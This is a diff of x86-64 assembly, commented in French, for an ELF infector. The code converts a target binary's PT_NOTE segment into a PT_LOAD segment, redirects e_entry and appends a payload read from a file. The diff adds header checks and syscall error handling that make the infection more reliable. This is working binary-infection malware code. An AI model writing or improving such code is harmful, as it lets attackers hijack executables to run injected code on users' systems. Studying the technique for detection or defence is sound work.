@@ -79,6 +79,15 @@ _start:
 	cmp eax, [vmagicnum]
 	jne erreur			; Vérifier le magic ELF
 
+	cmp byte [elfheader + 4], 2
+	jne erreur                    ; ELFCLASS64 = 0x02
+
+	cmp byte [elfheader + 5], 1
+	jne erreur                    ; little endian = 0x01
+
+	cmp word [elfheader + 0x12], 0x3E
+	jne erreur                    ; EM_X86_64 = 0x3E
+
 	mov rax, [elfheader + 0x18]
 	mov [recup_e_entry], rax	; Récupérer e_entry
 
@@ -87,6 +96,9 @@ _start:
 
 	mov ax, [elfheader + 0x36]
 	mov [recup_e_phentsize], ax	; Récupérer e_phentsize
+
+	cmp word [recup_e_phentsize], 56 	; Size e_phentsize = 56
+	jne erreur
 
 	mov ax, [elfheader + 0x38]
 	mov [recup_phnum], ax		; Récupérer e_phnum
@@ -107,7 +119,10 @@ boucle_proghead:
 	cmp rcx, rdx
 	jae fin_recherche		; Si i >= e_phnum, terminer
 
-	mov rax, [recup_e_phoff]	; RAX = e_phoff
+	mov rax, [recup_e_phoff]	; RAX = e_phoff et size = 64
+	cmp rax, 64
+	jb erreur
+
 
 	movzx rdx, word [recup_e_phentsize]
 	imul rdx, rcx			; RDX = i * e_phentsize
@@ -163,6 +178,10 @@ pt_load_trouve:
 	mov [p_align], rdx		; Récupérer p_align
 
 	mov rax, [p_memsz]
+	cmp rax, [p_filesz]
+	jb erreur 				; Verifie si p_memsz >= p_filesz
+
+	mov rax, [p_memsz]
 	sub rax, [p_filesz]
 	mov [espace_disponible], rax	; Calculer espace mémoire disponible
 
@@ -183,6 +202,13 @@ suite_boucle:
 	jmp boucle_proghead
 
 fin_recherche:
+
+	cmp qword [pt_note_sav], 0 		; Verifie si minimum 1 PT_NOTE trouvé
+	je erreur
+
+	cmp qword [pt_load_sav], 0 	 	; Verifie si minimum 1 PT_LOAD trouvé
+	je erreur
+
 	mov r13, [last_load_end]
 	add r13, 0x1000
 	and r13, ~0xFFF			; Nouvelle adresse virtuelle alignée
@@ -192,6 +218,9 @@ fin_recherche:
 	mov rsi, 0
 	mov rdx, 2
 	syscall				; Aller à la fin du fichier
+
+	cmp rax, 0
+	jl erreur
 
 	mov r12, rax			; R12 = offset de fin du fichier
 
@@ -213,7 +242,7 @@ fin_recherche:
 	mov rdi, r14
 	mov rsi, payload_buffer
 	mov rdx, 4096
-	syscall 	;Lit le payload pour compter le nombre d'octet
+	syscall 		; Lit le payload pour compter le nombre d'octet
 
 	cmp rax, 0
 	jle erreur
@@ -257,11 +286,17 @@ preparation_PT_LOAD:
 	mov rdx, 0
 	syscall				; Aller à l'offset e_entry
 
+	cmp rax, 0
+	jl erreur
+
 	mov rax, 1
 	mov rdi, r8
 	mov rsi, new_e_entry
 	mov rdx, 8
 	syscall				; Écrire le nouvel e_entry
+
+	cmp rax, 8
+	jne erreur
 
 	mov dword [program_header_buff], 1	; p_type = PT_LOAD
 
@@ -292,18 +327,26 @@ preparation_PT_LOAD:
 	mov rdx, 0
 	syscall				; Aller à l'ancien PT_NOTE
 
+	cmp rax, 0
+	jl erreur
+
 	mov rax, 1
 	mov rdi, r8
 	mov rsi, program_header_buff
 	mov rdx, 56
 	syscall				; Remplacer PT_NOTE par PT_LOAD
 
-	
+	cmp rax, 56
+	jne erreur
+
 	mov rax, 8 			; Aller à l'emplacement du payload
 	mov rdi, r8
 	mov rsi, [new_p_offset]
 	mov rdx, 0
 	syscall				; SEEK_SET vers new_p_offset
+
+	cmp rax, 0
+	jl erreur
 
 	; Écrire le payload dans simple
 	mov rax, 1
@@ -311,6 +354,9 @@ preparation_PT_LOAD:
 	mov rsi, payload_buffer
 	mov rdx, [payload_size]
 	syscall				; Écrire le payload
+
+	cmp rax, [payload_size]
+	jne erreur
 
 	mov rax, 3
 	mov rdi, r8
